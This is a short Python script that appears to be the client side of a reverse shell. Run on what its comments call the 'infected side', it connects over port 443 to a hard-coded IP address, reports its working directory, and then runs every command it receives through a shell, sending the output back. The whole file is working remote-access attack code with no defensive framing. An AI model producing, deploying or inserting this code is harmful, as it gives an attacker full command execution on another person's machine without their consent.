import socket
import os
import subprocess
import sys

#run this side in 

s = socket.socket() # Begins Socket Server

Name = socket.gethostname() #Gets name of Device
Host = socket.gethostbyname("localhost")  #Gets the IPV4 Address of the Device

#get IP Address of Current Machine
Port = 443
Size = 1024 * 128 # 128KB max size of messages, feel free to increase

#empty_mess = "There is nothing in this directory or this command doesn't return a value"

# connect to the server
s.connect(('10.67.98.152', Port)) #Your Local IP Here. Should change to host variable at onepoint. Currently only can connect if host is exact

confirm = s.recv(Size).decode()
print(confirm)   #Debugging. Will print a message if successfully connected (From Infected Side)

cwd = os.getcwd() #Sets cwd to os.getcwd()
s.send(cwd.encode()) #Sends the cwd to the Host

#Need to make it so you can just type in commands and allows to do almost anything. 
while True:
    command = s.recv(Size).decode()     

    if  command.startswith("cd "):
        os.chdir(str(command[3:]))  #Force change dir with built in OS function 
        s.send(os.getcwd().encode()) 

    else:
        CMD = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
        s.send(CMD.stderr.read()) #No encodeing needed due to .stderr and .stdout read as binary 
        s.send(CMD.stdout.read())
        
        
        

    







